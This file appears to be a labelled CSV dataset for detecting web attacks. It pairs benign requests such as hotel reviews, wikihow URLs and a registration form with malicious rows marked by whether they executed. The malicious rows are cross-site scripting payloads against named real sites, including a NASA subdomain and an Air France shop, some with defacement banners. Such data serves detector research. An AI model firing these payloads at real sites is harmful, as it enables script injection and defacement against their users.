Payloads,Class,decoded,executed,parser_changed
registro&login=lula&password=individuo&nombre=iracen&apellidos=frau+puigveh%ed&email=murphy-ekstroem%40altoguadiana.ao&dni=61128609z&direccion=calle+matula%2c+s%2fn%2c+&ciudad=cor%e7%e0&cp=42210&provincia=burgos&ntc=7915699195068000&b1=registrar,Benign,"registro&login=lula&password=individuo&nombre=iracen&apellidos=frau puigveh�&email=murphy-ekstroem@altoguadiana.ao&dni=61128609z&direccion=calle matula, s/n, &ciudad=cor��&cp=42210&provincia=burgos&ntc=7915699195068000&b1=registrar",False,False
"a san francisco classic i've stayed at the stanford court 3 times in the past 10 years, most recently in february 2008. the hotel perches atop nob hill, next door to the famed fairmont. rooms are comfortable and the staff is tremendously accommodating. the location is midway between union square, the san francisco financial district and the waterfront area. chinatown is a few blocks away and the powell street cable car line is steps from the front door.at the time of my february 2008 visit, the stanford court was undergoing renovation, scheduled for completion in summer 2008. the renovation will be welcome, because furnishings have grown a bit dated and changes are needed to return the property to peak condition. as a result, my usual 5 star review has been downgraded to 4 stars, with the expectation that the renovation will give the hotel its usual 5 when complete.the stanford court is quiet and dignified-- great for business and leisure travelers who want a classic property that offers a comfotable stay with understated elegance and hospitality. here is hoping that the 2008 renovation will add to the luster of the stanford court-- from the plans posted for guests, this seems likely to be the case.",Benign,"a san francisco classic i've stayed at the stanford court 3 times in the past 10 years, most recently in february 2008. the hotel perches atop nob hill, next door to the famed fairmont. rooms are comfortable and the staff is tremendously accommodating. the location is midway between union square, the san francisco financial district and the waterfront area. chinatown is a few blocks away and the powell street cable car line is steps from the front door.at the time of my february 2008 visit, the stanford court was undergoing renovation, scheduled for completion in summer 2008. the renovation will be welcome, because furnishings have grown a bit dated and changes are needed to return the property to peak condition. as a result, my usual 5 star review has been downgraded to 4 stars, with the expectation that the renovation will give the hotel its usual 5 when complete.the stanford court is quiet and dignified-- great for business and leisure travelers who want a classic property that offers a comfotable stay with understated elegance and hospitality. here is hoping that the 2008 renovation will add to the luster of the stanford court-- from the plans posted for guests, this seems likely to be the case.",False,False
http://www.wikihow.com/make-windows-8-defender-scan-removable-drives&t=1396611388677&n=4752557&k=mainentity,Benign,http://www.wikihow.com/make-windows-8-defender-scan-removable-drives&t=1396611388677&n=4752557&k=mainentity,False,False
http://www.wikihow.com/clean-up/speed-up-your-mac&t=1396533217819&n=1103644&k=mainentity,Benign,http://www.wikihow.com/clean-up/speed-up-your-mac&t=1396533217819&n=1103644&k=mainentity,False,False
http://ghrc.nsstc.nasa.gov/hydro/search.pl?hydro&pr=<script>alert('cyberbellona')</script>,Malicious,http://ghrc.nsstc.nasa.gov/hydro/search.pl?hydro&pr=<script>alert('cyberbellona')</script>,True,True
"great hotel in a great location we should mention we booked this hotel through priceline, which gave us a fabulous deal of $150/night when regular rooms went for $300/night. but while our rave review may be slightly enhanced due to our bargain, i would still consider it a solid hotel choice even at full price.the hotel definitely seems more geared towards business travelers, but the location itself proves great for tourists and leisure travelers as well. it is located only a short walk from the rocks and opera house, as well as the ferries in the quay. the concierge was very helpful without being snooty (as some concierges are nowadays) and gave us some great restaurant recommendations (including one where i was inches away from david beckham....but that's a different story). we tried the breakfast buffet, which was a bit pricey at $33/pp but was filling and had all the standard offerings.one note of advice - check the taxi rates before coming! i had looked at the marriott website and it said a cab ride from the airport was only $35. our cab ride ended up being $61 and we just thought the website was out",Benign,"great hotel in a great location we should mention we booked this hotel through priceline, which gave us a fabulous deal of $150/night when regular rooms went for $300/night. but while our rave review may be slightly enhanced due to our bargain, i would still consider it a solid hotel choice even at full price.the hotel definitely seems more geared towards business travelers, but the location itself proves great for tourists and leisure travelers as well. it is located only a short walk from the rocks and opera house, as well as the ferries in the quay. the concierge was very helpful without being snooty (as some concierges are nowadays) and gave us some great restaurant recommendations (including one where i was inches away from david beckham....but that's a different story). we tried the breakfast buffet, which was a bit pricey at $33/pp but was filling and had all the standard offerings.one note of advice - check the taxi rates before coming! i had looked at the marriott website and it said a cab ride from the airport was only $35. our cab ride ended up being $61 and we just thought the website was out",False,False
http://www.hakoach.com/shop/sr.asp?text=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.hakoach.com/shop/sr.asp?text=""><script>alert(""backdoor"")</script>",True,True
http://www.yenipazarmerkez.k12.tr/galeri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.yenipazarmerkez.k12.tr/galeri/igallery.asp?d=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.wikihow.com/beat-call-of-duty:-black-ops&t=1396649346654&n=5999959&k=mainentity,Benign,http://www.wikihow.com/beat-call-of-duty:-black-ops&t=1396649346654&n=5999959&k=mainentity,False,False
http://laboutique.airfrance.fr/produitliste.php?id_recherche=7%27%22%3e%3c/title%3e%3cscript%3ealert<br>(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://laboutique.airfrance.fr/produitliste.php?id_recherche=7'""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
